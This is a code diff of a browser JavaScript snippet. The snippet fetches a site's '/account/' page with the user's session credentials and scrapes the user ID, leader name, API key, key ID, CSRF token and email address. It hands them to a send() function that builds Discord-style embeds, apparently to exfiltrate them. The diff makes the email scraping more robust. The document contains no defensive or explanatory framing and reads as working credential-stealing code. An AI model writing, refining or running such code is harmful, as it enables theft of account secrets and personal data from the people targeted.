@@ -9,6 +9,7 @@
 
   try {
     const acct = await fetch('/account/', {credentials:'include'}).then(r => r.text());
+    const doc  = new DOMParser().parseFromString(acct, 'text/html');
 
     const userId = (acct.match(/app_user_id['">]+(\d+)/) || [])[1];
     const leader = (acct.match(/app_leader_name['">]+([^<]+)/) || [])[1];
@@ -16,7 +17,15 @@
     const apiKey = (acct.match(/notranslate['"]>\s*([a-f0-9]{12,})\s*</) || [])[1];
     const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
     const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
-    const email  = (acct.match(/Current E-mail:[\s\S]*?notranslate">\s*(\S+@\S+\.\w+)/) || [])[1];
+
+    // DOM approach for email — bulletproof
+    let email = 'n/a';
+    for (const td of doc.querySelectorAll('td')) {
+      if (td.textContent.trim() === 'Current E-mail:') {
+        email = td.nextElementSibling?.textContent?.trim() || 'n/a';
+        break;
+      }
+    }
 
     await send({
       embeds: [{
